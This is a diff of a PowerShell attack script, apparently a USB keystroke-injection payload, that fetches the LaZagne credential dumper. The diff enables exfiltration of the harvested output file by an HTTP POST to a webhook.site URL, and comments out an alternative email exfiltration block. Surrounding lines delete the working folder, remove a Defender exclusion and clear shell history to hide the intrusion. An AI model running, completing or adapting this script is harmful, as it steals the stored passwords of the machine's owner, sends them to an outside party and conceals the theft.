@@ -96,21 +96,21 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 
 # Exfiltrate the file
 #POST REQUEST
-#Invoke-WebRequest -Uri "http://IP:PORT0" -Method POST -Body Get-Content "$dir\output.txt"
+Invoke-WebRequest -Uri "https://webhook.site/fb091a2e-559c-4078-9162-24d4be4b1762" -Method POST -Body Get-Content "$dir\output.txt"
 
 #Mail Exfiltration
-$smtp = "" # Put SMTP SERVER HERE, TESTED WITH GOOGLES
-$From = "" # Put the SENDER HERE
-$To = "" # Put the RECEIVER HERE
-$smtp = "" # PUT YOUR SMTP SERVER HERE (TESTED WITH GOOGLE)
-$Subject = "Ducky Rapport"
-$Body = "Hi, here is the Rapport"
+#$smtp = "" # Put SMTP SERVER HERE, TESTED WITH GOOGLES
+#$From = "" # Put the SENDER HERE
+#$To = "" # Put the RECEIVER HERE
+#$smtp = "" # PUT YOUR SMTP SERVER HERE (TESTED WITH GOOGLE)
+#$Subject = "Ducky Rapport"
+#$Body = "Hi, here is the Rapport"
 
 # The password is an app-specific password if you have 2-factor-auth enabled
-$Password = "" | ConvertTo-SecureString -AsPlainText -Force
-$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
+#$Password = "" | ConvertTo-SecureString -AsPlainText -Force
+#$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
 # The smtp server used to send the file
-Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments "$dir\output.txt" -SmtpServer $smtp -port 587 -UseSsl -Credential $Credential
+#Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments "$dir\output.txt" -SmtpServer $smtp -port 587 -UseSsl -Credential $Credential
 
 # Clean up
 Remove-Item -Path $dir -Recurse -Force
@@ -120,5 +120,3 @@ Remove-MpPreference -ExclusionPath $dir
 # Remove the script from the system
 Clear-History
 
-# Reboot the system
-Restart-Computer -Force
